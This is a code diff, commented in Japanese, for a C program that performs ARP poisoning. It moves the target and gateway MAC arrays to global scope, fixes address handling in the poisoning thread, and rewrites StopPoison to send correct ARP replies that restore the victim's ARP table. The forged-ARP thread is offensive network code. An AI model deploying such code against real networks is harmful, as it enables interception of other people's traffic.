@@ -20,6 +20,8 @@ int isPoisoning = 0;
 
 struct in_addr target_addr;
 struct in_addr gateway_addr;
+u_int8_t t_mac[6];
+u_int8_t g_mac[6];
 
 /*
 フラグ(isPoisonig=true)が立っている場合は、
@@ -41,13 +43,12 @@ void *PoisonThread(void * arg)
     //gatewayのIPアドレス
     g_addr.l = gateway_addr.s_addr;
     //my IP Address
-    m_addr = Param.vip;
+    m_addr.l = Param.vip.s_addr;
 
-    u_int8_t t_mac[6];
-    u_int8_t g_mac[6];
-    ArpSearchTable(*target_addr, t_mac);
-    ArpSearchTable(*gateway_addr, g_mac);
+    ArpSearchTable(target_addr, t_mac);
+    ArpSearchTable(gateway_addr, g_mac);
     
+    int soc = GetDeviceSoc();
     // send ARP Reply to target PC
     ArpSend
     (
@@ -99,7 +100,19 @@ void StartPoison(int soc, struct in_addr *target, struct in_addr *gateway)
 void StopPoison(void)
 {
     printf("[*]Stop ARP Poison");
-    isPoisoning = 0;
+
+    if(isPoisoning != 1){ return; }
+
+    union {
+        u_int32_t l;
+        u_int8_t c[4];
+    }t_addr, g_addr;
+
+    //targetPCのIPアドレス
+    t_addr.l = target_addr.s_addr;
+    //gatewayのIPアドレス
+    g_addr.l = gateway_addr.s_addr;
+
     int i;
     // 5回くらい正しいARP Replyを送信して攻撃対象のARPテーブルを戻す
     for(i = 0; i < 5; i++)
@@ -130,4 +143,6 @@ void StopPoison(void)
             g_addr.c     //daddr  gatewayのIPアドレス
         );
     }
+
+    isPoisoning = 0;
 }
